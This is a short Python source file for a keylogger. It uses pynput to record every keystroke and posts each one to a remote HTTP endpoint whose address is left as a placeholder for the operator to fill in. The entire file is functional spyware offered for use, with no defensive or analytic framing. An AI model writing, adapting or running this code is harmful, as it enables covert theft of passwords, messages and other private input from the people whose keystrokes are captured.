import requests
from pynput import keyboard
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
LOG_URL = 'http://<your-ip-address>:80/log' # NOTE: Change this to your remote logging service URL

def log_key(key):
    """
    Logs the pressed key to the remote logging service.
    """
    try:
        data = f"{key.char}"  # Convert key to readable characters
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl) that don't have a char attribute
        data = f"{key}"

    try:
        response = requests.post(LOG_URL, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        logging.info(f"Key logged: {data}")
    except requests.RequestException as ex:
        logging.error(f"Error sending log data: {ex}")

def main():
    """
    Main function to set up the keylogger and handle key press events.
    """
    # Create a listener object
    listener = keyboard.Listener(on_press=log_key)

    try:
        listener.start()  # Start the listener
        listener.join()   # Join the listener to the main thread
    except KeyboardInterrupt:
        logging.info("Keylogger stopped by user.")
    except Exception as ex:
        logging.error(f"Error while catching events: {ex}")
    finally:
        listener.stop()

if __name__ == "__main__":
    main()
